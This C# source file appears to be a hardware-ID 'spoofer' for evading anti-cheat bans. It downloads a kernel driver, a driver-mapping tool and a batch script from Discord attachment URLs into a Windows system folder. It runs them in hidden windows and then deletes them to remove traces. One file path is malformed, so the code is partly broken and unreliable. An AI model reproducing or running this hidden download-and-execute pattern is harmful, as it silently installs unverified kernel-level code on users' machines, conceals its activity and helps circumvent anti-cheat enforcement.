using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Linq;
using System.Threading;

namespace Skidded_Spoofer
{
    class Spoof
    {
        public static void SpoofHWID()
        {
            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\mapper.exe";
            string text2 = @"C\Windows\IME\spoofer.sys";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/727855516965011548/731223058278514778/spoofer.sys", text2);
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/727855516965011548/731223070026498078/mapper.exe", text);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text, text2);
            Thread.Sleep(1000);
            process.Close();
            File.Delete(text2);
            File.Delete(text);




        }

        public static void CleanTraces()
        {

            WebClient webClient = new WebClient();
            string text = @"C:\Windows\IME\Run_me.bat";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/727855516965011548/731227744750272623/Run_me.bat", text);
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text);
            Thread.Sleep(1000);
            process.Close();
            File.Delete(text);
        }
    }
}
